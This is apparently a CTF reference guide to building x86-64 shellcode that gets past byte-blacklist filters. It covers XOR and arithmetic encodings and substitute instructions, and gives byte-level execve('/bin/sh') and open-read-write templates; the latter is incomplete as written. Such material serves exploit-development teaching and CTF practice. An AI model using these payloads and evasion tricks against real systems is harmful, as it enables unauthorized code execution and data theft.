# Shellcode Filtering and Byte Blacklists

Techniques for writing shellcode that avoids specific forbidden bytes imposed by the challenge's filter function.

## Table of Contents
- [Identification](#identification)
- [Blacklist Analysis](#blacklist-analysis)
- [Encoding Strategies](#encoding-strategies)
- [Alternative Syscall Construction](#alternative-syscall-construction)
- [String Construction Without Blocked Bytes](#string-construction-without-blocked-bytes)
- [Instruction-Level Substitutions](#instruction-level-substitutions)
- [Template: execve Bypass](#template-execve-bypass)
- [Template: ORW (open-read-write) Bypass](#template-orw-open-read-write-bypass)
- [Verification Checklist](#verification-checklist)

---

## Identification

Signs a challenge uses shellcode filtering:

```c
// Pattern 1: explicit blacklist + loop check
char blacklist[] = "\x3b\x0f\x05...";
for (int i = 0; i < sizeof(blacklist)-1; i++)
    for (int j = 0; j < input_len; j++)
        if (input[j] == blacklist[i]) reject();
execute_as_shellcode(input);

// Pattern 2: seccomp (different — covered in sandbox.md)
// Pattern 3: iopl/emulation-based (exotic — covered in weird-machines.md)
```

Key observation: `check(blacklist, buf, size, strlen(blacklist))` loops `j < size-1` — the **last byte** of the input is never checked. One safe byte can sometimes be placed at the end to complete an instruction.

---

## Blacklist Analysis

Decode all blocked bytes before writing a single instruction:

```python
BLACKLIST = bytes([0x3b,0x54,0x62,0x69,0x6e,0x73,0x68,...])

# Semantic decode:
# 0x3b = 59 = SYS_execve syscall number
# 0x62 0x69 0x6e = "bin"
# 0x73 0x68 = "sh"
# 0x66 0x6c 0x61 0x67 = "flag"
# 0x5f = pop rdi (common argument-loading instruction)
# 0x68 = push imm32 (common string-pushing instruction)
# 0x0f 0x05 = syscall instruction itself (if blocked → need sysenter or int 0x80)
```

Write a quick verifier before finalizing shellcode:

```python
def check(sc, blacklist, strict=True):
    # strict=True: check all bytes; strict=False: skip last byte (common in CTF)
    limit = len(sc) - 1 if not strict else len(sc)
    bad = [(i, hex(sc[i])) for i in range(limit) if sc[i] in blacklist]
    return bad  # empty = clean
```

---

## Encoding Strategies

### XOR encoding in register (preferred — no stack ops needed)

Encode the blocked payload (string, address) by XOR with a safe key, then decode in register before use:

```python
# Find a safe XOR key: all result bytes must avoid the blacklist
def find_xor_key(target_bytes, blacklist):
    for key in range(1, 256):
        encoded = bytes(b ^ key for b in target_bytes)
        if not any(e in blacklist for e in encoded) and key not in blacklist:
            return key
    return None  # try multi-byte key

target = b'/bin/sh\x00'
key = find_xor_key(target, BLACKLIST)
encoded_val = int.from_bytes(bytes(b ^ key for b in target), 'little')
```

Assembly (x86-64):

```asm
; Load encoded qword, XOR key in registers, push result
mov rax, <encoded_qword>       ; 48 b8 + 8 bytes
mov rbx, <key_qword>           ; 48 bb + 8 bytes (e.g., 0x1313131313131313)
xor rax, rbx                   ; 48 31 d8   (3 bytes)
push rax                       ; 50         (1 byte)
; rsp → decoded string
```

### ADD/SUB encoding (when XOR key itself is blocked)

```asm
; mov eax, <value+delta>
; sub eax, <delta>
; push rax
; (avoids push imm32 = 0x68 which is often blocked)
```

### Self-modifying shellcode (when space allows)

```asm
; Place encoded shellcode after decoder stub
; Decoder XORs bytes in-place, then jumps to decoded shellcode
; Only useful when execstack or writable+executable memory is confirmed
```

### Polymorphic byte construction via arithmetic

```python
# Build any byte value using safe ADD/SUB sequences
# E.g., if 0x3b (59) is blocked but 0xb8 (MOV EAX,imm) is safe:
# mov al, 0x3c  (60)  →  b0 3c
# dec al        (59)  →  fe c8
# → rax = 59 = SYS_execve, without 0x3b appearing in shellcode
```

---

## Alternative Syscall Construction

### Syscall number without the literal byte

| Syscall | Number | Blocked byte | Construction |
|---------|--------|--------------|-------------|
| execve | 59 = 0x3b | 0x3b | `mov al, 0x3c; dec al` or `push 0x3c; pop rax; dec rax` |
| open | 2 | usually safe | direct `mov al, 2` |
| openat | 257 = 0x101 | usually safe | `mov ax, 0x101` |
| read | 0 | usually safe | `xor eax, eax` (if xor opcode not blocked) |
| write | 1 | usually safe | `mov al, 1` |
| execveat | 322 = 0x142 | usually safe | `mov eax, 0x142` |

### syscall instruction itself blocked (0x0f 0x05)

```asm
; x86 alternatives:
int 0x80    ; 32-bit ABI (rax ≤ 255, args in ebx/ecx/edx/esi/edi)
sysenter    ; rare but sometimes available
; Or: find a syscall gadget in libc/vdso and call it
```

---

## String Construction Without Blocked Bytes

### "/bin/sh" byte analysis

```
/ = 0x2f  ← usually safe
b = 0x62  ← blocked in most execve challenges
i = 0x69  ← blocked
n = 0x6e  ← blocked
/ = 0x2f  ← safe
s = 0x73  ← blocked
h = 0x68  ← blocked (also == push imm32 opcode)
```

**Alternatives to "/bin/sh":**
- `/bin//sh` — same bytes, doesn't help
- `//bin/sh` — same
- `/bin/bash` — b=0x62 blocked
- `/bin/dash` — a=0x61 may be blocked
- **Construct at runtime** via XOR encoding (see above) — most reliable

### "/flag" byte analysis

```
/ = 0x2f ← safe
f = 0x66 ← blocked
l = 0x6c ← blocked
a = 0x61 ← blocked
g = 0x67 ← blocked
```

All of "flag" is typically blocked when the flag filename itself is filtered. Must construct at runtime.

### Runtime construction — environment alternative

If constructing strings is too expensive in limited shellcode space:
```asm
; Use execve with environment search
; Or: use /proc/self/environ to find shell path
; Or: use openat(-100, "flag", O_RDONLY) if the binary's cwd contains flag
; AT_FDCWD = -100 = 0xffffff9c — safe bytes usually
```

---

## Instruction-Level Substitutions

| Blocked | Replacement |
|---------|------------|
| `push imm32` (0x68) | `mov eax, imm32; push rax` |
| `pop rdi` (0x5f) | `mov rdi, rax` or `push rax; pop rdi` (if 0x5f not in sequence) |
| `xor rax, rax` (0x31 0xc0 where 0xc0 blocked) | `mov eax, 0` (0xb8 0x00 0x00 0x00 0x00) |
| `xor rsi, rsi` (0x31 0xf6 where 0xf6 blocked) | `mov esi, 0` (0xbe 0x00 0x00 0x00 0x00) |
| `xor rdx, rdx` (0x31 0xd2 where 0xd2 blocked) | `mov edx, 0` (0xba 0x00 0x00 0x00 0x00) |
| `cdq` (0x99, sign-extends rax→rdx) | `mov edx, 0` if rdx must be 0 |
| `leave` (0xc9) | `mov rsp, rbp; pop rbp` |
| `syscall` (0x0f 0x05) | `int 0x80` (32-bit ABI) or find gadget |
| `dec rax` (0x48 0xff 0xc8) | use if 0xc8 not blocked; else `sub rax, 1` |

---

## Template: execve Bypass

For blacklist: `{0x3b, 0x62, 0x69, 0x6e, 0x73, 0x68, 0x5f, 0xf6, 0xd2, 0xc0, 0x66, 0x6c, 0x61, 0x67, ...}`

```python
import struct

def p64(v): return struct.pack('<Q', v)

KEY = 0x13
# "/bin/sh\0" XOR 0x13 → 0x137b603c7d7a713c
ENCODED = int.from_bytes(bytes(b ^ KEY for b in b'/bin/sh\x00'), 'little')
KEY_QWORD = KEY * 0x0101010101010101

sc = (
    b'\x48\xb8' + p64(ENCODED) +          # mov rax, encoded_string
    b'\x48\xbb' + p64(KEY_QWORD) +         # mov rbx, key_qword
    b'\x48\x31\xd8' +                      # xor rax, rbx → "/bin/sh\0"
    b'\x50' +                              # push rax
    b'\x48\x89\xe7' +                      # mov rdi, rsp
    b'\xbe\x00\x00\x00\x00' +             # mov esi, 0 (argv=NULL)
    b'\xba\x00\x00\x00\x00' +             # mov edx, 0 (envp=NULL)
    b'\x6a\x3c' +                          # push 0x3c (60)
    b'\x58' +                              # pop rax
    b'\x48\xff\xc8' +                      # dec rax → 59 (execve)
    b'\x0f\x05'                            # syscall
)  # 45 bytes
```

---

## Template: ORW (open-read-write) Bypass

When execve is blocked (syscall+string) but open/read/write are available:

```python
# 1. open("flag", O_RDONLY) → fd
# 2. read(fd, buf, 100)
# 3. write(1, buf, 100)
# Construct "flag" string at runtime via XOR

FLAG_KEY = 0x11
FLAG_ENCODED = int.from_bytes(bytes(b ^ FLAG_KEY for b in b'flag'), 'little')

sc_orw = (
    # --- open("flag", 0) ---
    b'\xeb\x10' +                          # jmp over flag string
    # ... flag string placed after shellcode body, pointed to by rdi
    # ... or constructed on stack via XOR as above
    
    # sys_open = 2
    b'\xb8\x02\x00\x00\x00' +             # mov eax, 2
    # rdi = ptr to "flag" string (constructed above)
    b'\xbe\x00\x00\x00\x00' +             # mov esi, 0 (O_RDONLY)
    b'\x0f\x05' +                          # syscall → fd in rax
    
    # --- read(fd, rsp-0x100, 100) ---
    b'\x89\xc7' +                          # mov edi, eax (fd)
    b'\x48\x89\xe6' +                      # mov rsi, rsp (buf on stack)
    b'\xba\x64\x00\x00\x00' +             # mov edx, 100
    b'\xb8\x00\x00\x00\x00' +             # mov eax, 0 (read)
    b'\x0f\x05' +                          # syscall
    
    # --- write(1, buf, rax) ---
    b'\x48\x89\xc2' +                      # mov rdx, rax (bytes read)
    b'\xbf\x01\x00\x00\x00' +             # mov edi, 1 (stdout)
    b'\x48\x89\xe6' +                      # mov rsi, rsp
    b'\xb8\x01\x00\x00\x00' +             # mov eax, 1 (write)
    b'\x0f\x05'                            # syscall
)
```

---

## Verification Checklist

Before sending shellcode:

```python
def verify(sc, blacklist, check_last=False):
    limit = len(sc) if check_last else len(sc) - 1
    bad = [(i, hex(sc[i])) for i in range(limit) if sc[i] in blacklist]
    assert len(sc) <= MAX_LEN, f"Too long: {len(sc)}"
    assert not bad, f"Blocked bytes: {bad}"
    # Also verify the encoded string decodes correctly
    print(f"Clean: {len(sc)} bytes, hex: {sc.hex()}")
```

Common mistakes:
- Including shell command bytes in the initial read (the filter checks ALL bytes read, not just shellcode)
- Forgetting that `push imm32` opcode 0x68 is itself often in the blacklist
- XOR key that produces another blocked byte in the encoded form
- Not sending shellcode and commands as separate I/O transactions
